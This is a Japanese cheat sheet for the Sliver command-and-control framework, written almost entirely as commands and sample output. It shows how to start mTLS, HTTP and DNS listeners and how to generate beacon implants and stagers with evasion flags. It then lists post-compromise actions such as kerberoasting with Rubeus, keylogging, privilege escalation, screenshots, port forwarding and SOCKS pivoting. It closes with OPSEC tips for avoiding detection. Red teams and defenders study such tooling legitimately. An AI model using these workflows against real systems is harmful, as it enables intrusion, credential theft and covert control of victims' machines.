# Sliver C2 コマンド完全チートシート & 詳細解説

## 1. インストール・初期セットアップ
### 1.1 インストール（Linux / macOS推奨）

```bash
# 公式インストールスクリプト（最も簡単）
curl https://sliver.sh/install | sudo bash

# またはソースからビルド
git clone https://github.com/BishopFox/sliver.git
cd sliver
make
```

**出力例**:
```
[] Downloading Sliver v1.XX.X ...
[] Installing to /usr/local/bin/sliver-server and /usr/local/bin/sliver
```


### 1.2 Server起動

```bash
# 通常起動
sliver-server

# バックグラウンドでsystemdサービスとして起動（推奨）
sudo systemctl start sliver-server
sudo systemctl enable sliver-server
```

**確認コマンド**:
```bash
sudo systemctl status sliver-server
```

### 1.3 Console接続

```bash
sliver
```

初回接続時は自動でServerに接続されます。

## 2. 基本操作コマンド

| コマンド          | 説明                              | よく使う場面             |
|-------------------|-----------------------------------|--------------------------|
| `help`            | ヘルプ表示                        | コマンド忘れた時         |
| `jobs`            | 現在起動中のListener一覧          | Listener確認             |
| `sessions`        | SessionモードImplant一覧          | Session操作              |
| `beacons`         | BeaconモードImplant一覧           | Beacon操作               |
| `beacons watch`   | Beaconのリアルタイム監視          | チェックイン監視         |
| `use <id>`        | 指定Implantを操作対象に設定       | ほぼ全ての操作で使用     |
| `background`      | 現在のImplant操作を終了           | 操作終了時               |
| `exit` / `quit`   | Console終了                       | 作業終了時               |

**例: Beacon一覧を確認**
```bash
sliver > beacons
```

**出力例**:
```
ID        Name              Transport   OS/Arch         Last Check-In   Next Check-In
========= ================= =========== =============== =============== ===============
c9b67cda  STALE_PNEUMONIA   mtls        windows/amd64   12s ago         48s
```

## 3. Listener 関連コマンド（最重要）

### 3.1 HTTP / HTTPS Listener

```bash
# HTTP Listener起動
http

# 特定IP・ポートで起動
http -L 0.0.0.0 -l 8080

# HTTPS（証明書指定）
https -L 203.0.113.50 -l 443 --cert /path/to/cert.pem --key /path/to/key.pem
```

**jobsで確認**:
```bash
sliver > jobs
```

### 3.2 mTLS Listener（最も推奨）

```bash
mtls -L 0.0.0.0 -l 443
```

**特徴**: 相互認証で最も安全。実運用で最もよく使われる。

### 3.3 DNS Listener

```bash
dns -L 0.0.0.0 -l 53 --domains c2.example.com,backup.example.com
```

### 3.4 Stage Listener（Stager用）

```bash
# TCP Stage Listener
stage-listener --url tcp://203.0.113.50:9999 --profile myprofile

# HTTP Stage Listener
stage-listener --url http://203.0.113.50:80 --profile myprofile
```

**重要**: Stage Listenerは**Implantを配信するだけ**の短命リスナー。通常のC2 Listenerとは別に立てる。

## 4. Implant生成コマンド（generate / profiles）

### 4.1 基本的なBeacon生成

```bash
# 最もシンプルなHTTP Beacon
generate beacon --http 203.0.113.50 --os windows --format exe -N initial_beacon

# mTLS + 実運用設定（推奨）
generate beacon --mtls 203.0.113.50:443 --seconds 60 --jitter 25 --format exe --os windows -N prod_beacon
```

**出力例**:
```
[] Generating new windows/amd64 beacon implant binary
[] Symbol obfuscation is enabled
[] Build completed in 00:00:45
[] Implant saved to /home/user/prod_beacon.exe
```

### 4.2 重要な生成フラグ一覧

| フラグ                    | 説明                                      | 推奨値例                  | 備考 |
|---------------------------|-------------------------------------------|---------------------------|------|
| `--http` / `--https`      | HTTP(S) C2                                | `http://IP`               | 最も簡単 |
| `--mtls`                  | mTLS C2                                   | `IP:443`                  | 最も安全 |
| `--dns`                   | DNS C2                                    | `domain.com`              | 低頻度運用 |
| `--seconds` / `--minutes` | チェックイン間隔                          | `60`                      | - |
| `--jitter`                | 間隔の揺らぎ（秒）                        | `20-30`                   | OPSEC最重要 |
| `--format`                | 出力形式                                  | `exe`, `shellcode`        | shellcodeはステージング向き |
| `--skip-symbols`          | シンボル難読化をスキップ                  | -                         | ビルド高速化・サイズ縮小 |
| `--evasion`               | EDR回避機能有効化                         | -                         | ビルド時間増加 |
| `--os` / `--arch`         | ターゲットOS/アーキテクチャ               | `windows` `amd64`         | - |
| `-N`                      | インプラント名                            | `mybeacon`                | 管理しやすくする |

### 4.3 Profileを使った生成（推奨）

```bash
# Profile作成
profiles new beacon --mtls 203.0.113.50:443 --seconds 60 --jitter 25 --format exe --os windows prod_profile

# Profileから生成
generate beacon prod_profile
```

## 5. Beacon / Session 操作コマンド

### 5.1 Beacon操作

```bash
# Beacon一覧
beacons

# 特定Beaconを操作対象に
use c9b67cda

# 一時的に対話セッションを開く（非常に便利）
interactive

# セッションを閉じて通常のBeaconに戻る
close

# 設定変更（間隔・jitterを後から変更可能）
reconfig --interval 30s --jitter 10s
```

### 5.2 Session操作

```bash
# Session一覧
sessions

# Sessionを操作
use <session_id>

# バックグラウンドに戻す
background
```

### 5.3 Implant情報確認

```bash
info
```

**出力例**:
```
Name:           STALE_PNEUMONIA
ID:             c9b67cda-...
Transport:      mtls
OS:             windows/amd64
Username:       DESKTOP-XXXX\user
Hostname:       DESKTOP-XXXX
PID:            1234
Interval:       60s
Jitter:         25s
```

## 6. Implant内部で実行する主なコマンド

Implant内で使えるコマンド（`use` した後に実行）

### ファイル操作
```bash
ls
pwd
cd C:\Users
download /path/to/file
upload /local/file C:\target\file
rm file.txt
mkdir newdir
```

### プロセス操作
```bash
ps
execute -o whoami
execute-assembly Rubeus.exe kerberoast
execute-shellcode beacon.bin
```

### ネットワーク・ピボット
```bash
ifconfig
netstat
portfwd add -r 127.0.0.1:3389 -l 0.0.0.0:13389
socks start -l 1080
```

### その他便利コマンド
```bash
getuid
getprivs
whoami
screenshot
keylogger start
getsystem          # 権限昇格試行（Windows）
```

## 7. Stager関連コマンド

```bash
# Stager生成（C#用例）
generate stager --lhost 203.0.113.50 --lport 8080 --arch amd64 --format csharp

# Stage Listener起動（Profile指定必須）
stage-listener --url http://203.0.113.50:8080 --profile my_staging_profile
```

**ワークフロー例**:
1. Profile作成
2. Stage Listener起動
3. Stagerを生成して標的に配置
4. Stager実行 → 自動でフルImplantがメモリ展開

## 8. その他の便利コマンド

| コマンド               | 説明                              | 使いどころ                     |
|------------------------|-----------------------------------|--------------------------------|
| `tasks`                | 現在のImplantのタスク一覧         | 実行中タスク確認               |
| `cancel <task_id>`     | タスクキャンセル                  | 長時間かかっているタスク停止   |
| `generate info`        | 対応アーキテクチャ確認            | クロスコンパイル確認           |
| `armory`               | 拡張機能インストール              | BOFやツール追加                |
| `extensions`           | インストール済み拡張一覧          | -                              |
| `version`              | Sliverバージョン確認              | -                              |
| `rebuild`              | Implant再ビルド                   | 設定変更後                     |

## 9. 実践的なワークフロー例

### ワークフロー1: 標準的なBeacon運用（mTLS推奨）

```bash
# 1. mTLS Listener起動
mtls -L 0.0.0.0 -l 443

# 2. Profile作成
profiles new beacon --mtls 203.0.113.50:443 --seconds 60 --jitter 25 --format exe --os windows prod_beacon

# 3. Implant生成
generate beacon prod_beacon

# 4. 標的に配置・実行後
beacons
use <id>
interactive          # 必要に応じて対話操作
```

### ワークフロー2: Stagerを使ったサイズ制限対策

```bash
# 1. Profile作成（shellcode形式）
profiles new beacon --http 203.0.113.50:80 --seconds 30 --jitter 10 --format shellcode --skip-symbols stage_profile

# 2. Stage Listener起動
stage-listener --url http://203.0.113.50:80 --profile stage_profile

# 3. Stager生成（C#やPowerShellに埋め込む用）
generate stager --lhost 203.0.113.50 --lport 80 --arch amd64 --format csharp
```

## 10. OPSECポイントまとめ

- **間隔**: 実運用では `--seconds 45-120 --jitter 20-40` が無難
- **プロトコル**: 可能なら **mTLS** を最優先。次点でHTTPS
- **生成時**: 本番は `--skip-symbols` を**付けない**（難読化を有効に）
- **Stager**: サイズ制限や検知を避けたい場合は積極的に使用
- **interactive**: Beaconで長時間操作する場合は多用（通常のBeaconループに戻せる）
- **reconfig**: 運用中に間隔を調整可能（検知されたら長くする）

## 11. トラブルシューティング

```bash
# Listenerが起動しない場合
jobs
kill <job_id>

# Implantが接続してこない場合
beacons watch          # リアルタイム監視
info                   # 現在の設定確認
reconfig --interval 10s --jitter 0   # 一時的に短くしてテスト
```
